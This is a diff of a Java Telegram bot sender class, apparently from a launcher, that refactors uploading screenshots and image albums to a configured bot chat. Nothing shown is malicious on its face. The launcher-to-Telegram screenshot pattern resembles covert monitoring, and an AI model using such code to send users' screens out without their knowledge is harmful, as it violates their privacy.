@@ -12,6 +12,7 @@ import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
@@ -22,28 +23,49 @@ public class TelegramBotSender {
     private static final LauncherConfig config = ConfigManager.loadConfig();
     private static final Random random = new Random();
 
-    public static void sendAlbum(String caption, File... photos) {
-        if (photos == null || photos.length == 0) return;
+    public static void sendImageBytes(byte[] imageBytes, String caption) {
+        if (imageBytes == null || imageBytes.length == 0) return;
+        try {
+            sendMultipart("sendPhoto", "photo", imageBytes, "screenshot.png", "image/png", caption);
+        } catch (Exception e) {
+            sendText("[EXCEPTION] Ошибка при отправке скриншота: " + e.getMessage());
+        }
+    }
+
+    public static void sendAlbum(String caption, File[] files) {
+        if (files == null || files.length == 0) {
+            sendText(caption != null ? caption : "(пусто)");
+            return;
+        }
+
+        List<byte[]> images = new ArrayList<>();
+        for (File f : files) {
+            try {
+                byte[] bytes = Files.readAllBytes(f.toPath());
+                images.add(bytes);
+            } catch (IOException e) {
+                System.err.println("Не удалось прочитать файл " + f.getName() + ": " + e.getMessage());
+            }
+        }
+
+        sendAlbum(caption, images); // используем твой метод с List<byte[]>
+    }
+
+
+    public static void sendAlbum(String caption, List<byte[]> images) {
+        if (images == null || images.isEmpty()) {
+            sendText(caption != null ? caption : "(пусто)");
+            return;
+        }
 
         try {
-            String urlString = "https://api.telegram.org/bot" + config.getBotToken() + "/sendMediaGroup";
-            URL url = new URL(urlString);
-            String boundary = "----Boundary" + System.currentTimeMillis();
+            String urlString = API_URL + config.getBotToken() + "/sendMediaGroup";
+            String boundary = "Boundary-" + System.currentTimeMillis();
 
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-
-            // JSON media
-            JSONArray media = new JSONArray();
-            for (int i = 0; i < photos.length; i++) {
-                JSONObject obj = new JSONObject();
-                obj.put("type", "photo");
-                obj.put("media", "attach://photo" + i);
-                if (i == 0 && caption != null && !caption.isBlank()) obj.put("caption", caption);
-                media.put(obj);
-            }
 
             try (OutputStream os = conn.getOutputStream();
                  PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {
@@ -53,46 +75,44 @@ public class TelegramBotSender {
                         .append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                         .append(config.getChatId()).append("\r\n");
 
-                // media
-                writer.append("--").append(boundary).append("\r\n")
-                        .append("Content-Disposition: form-data; name=\"media\"\r\n\r\n")
-                        .append(media.toString()).append("\r\n");
-
-                // файлы
-                for (int i = 0; i < photos.length; i++) {
-                    writer.append("--").append(boundary).append("\r\n")
-                            .append("Content-Disposition: form-data; name=\"photo").append(String.valueOf(i))
-                            .append("\"; filename=\"").append(photos[i].getName()).append("\"\r\n")
-                            .append("Content-Type: image/png\r\n\r\n").flush();
-
-                    Files.copy(photos[i].toPath(), os);
-                    os.flush();
-                    writer.append("\r\n").flush();
+                // JSON для media
+                JSONArray mediaArray = new JSONArray();
+                for (int i = 0; i < images.size(); i++) {
+                    JSONObject mediaObj = new JSONObject();
+                    mediaObj.put("type", "photo");
+                    mediaObj.put("media", "attach://file" + i);
+                    if (i == 0 && caption != null) {
+                        mediaObj.put("caption", caption);
+                    }
+                    mediaArray.put(mediaObj);
                 }
 
-                // конец
+                writer.append("--").append(boundary).append("\r\n")
+                        .append("Content-Disposition: form-data; name=\"media\"\r\n\r\n")
+                        .append(mediaArray.toString()).append("\r\n");
+
+                // сами файлы
+                for (int i = 0; i < images.size(); i++) {
+                    byte[] img = images.get(i);
+                    writer.append("--").append(boundary).append("\r\n")
+                            .append("Content-Disposition: form-data; name=\"file").append(String.valueOf(i))
+                            .append("\"; filename=\"screenshot_").append(String.valueOf(i)).append(".png\"\r\n")
+                            .append("Content-Type: image/png\r\n\r\n").flush();
+
+                    os.write(img);
+                    os.flush();
+                    writer.append("\r\n");
+                }
+
                 writer.append("--").append(boundary).append("--\r\n").flush();
             }
 
-            int responseCode = conn.getResponseCode();
-            System.out.println("Telegram album send response: " + responseCode);
-
-            if (responseCode != 200) {
-                try (InputStream err = conn.getErrorStream()) {
-                    if (err != null) {
-                        String errorMsg = new String(err.readAllBytes(), StandardCharsets.UTF_8);
-                        System.err.println("Ошибка ответа Telegram API: " + errorMsg);
-                    }
-                }
-            }
-
+            handleResponse(conn);
         } catch (Exception e) {
-            e.printStackTrace();
+            sendText("[EXCEPTION] Ошибка при отправке альбома: " + e.getMessage());
         }
     }
 
-
-    // Пул потоков для асинхронных задач
     private static final ExecutorService executor = Executors.newCachedThreadPool();
 
     // -----------------------
